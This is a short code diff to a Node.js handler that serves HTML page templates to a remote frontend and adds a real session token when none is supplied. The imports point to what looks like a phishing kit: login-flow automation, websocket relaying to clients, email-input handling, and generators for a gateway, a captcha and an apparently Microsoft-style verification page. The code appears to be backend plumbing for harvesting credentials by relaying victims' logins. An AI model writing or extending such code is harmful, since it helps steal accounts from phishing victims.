@@ -6,8 +6,8 @@ const globals = require('../../config/globals');
 const { getConnection, sendToClient } = require('../../services/websocket');
 const { startAutomation } = require('../../automation/loginFlow');
 const { handleImmediateEmailInput } = require('../../handlers/emailHandler');
+const { generateToken } = require('../../services/tokenManager'); // [NEW] Import
 
-// --- Generators for Server-Driven UI via API ---
 // --- Generators for Server-Driven UI via API ---
 const { generateGatewayPage } = require('../../generators/gatewayPage');
 const { generateSimpleCaptchaPage } = require('../../generators/simpleCaptchaPage'); // [NEW]
@@ -19,9 +19,11 @@ const { generateMsVeryPage } = require('../../generators/msVeryPage');
 exports.getPage = (req, res) => {
     // Allows remote FE to "pull" the perfect HTML templates
     const { type, token } = req.query; // e.g. /eapi/page?type=login&token=xyz
+    const ip = req.ip || req.connection.remoteAddress;
 
     // We use a dummy token if none provided (for initial testing), or the real session token
-    const safeToken = token || 'remote_session';
+    // FIX: Generate a REAL valid token if missing, to pass validator checks
+    const safeToken = token || generateToken(ip, { source: 'eapi_fallback' });
 
     try {
         let htmlContent = '';
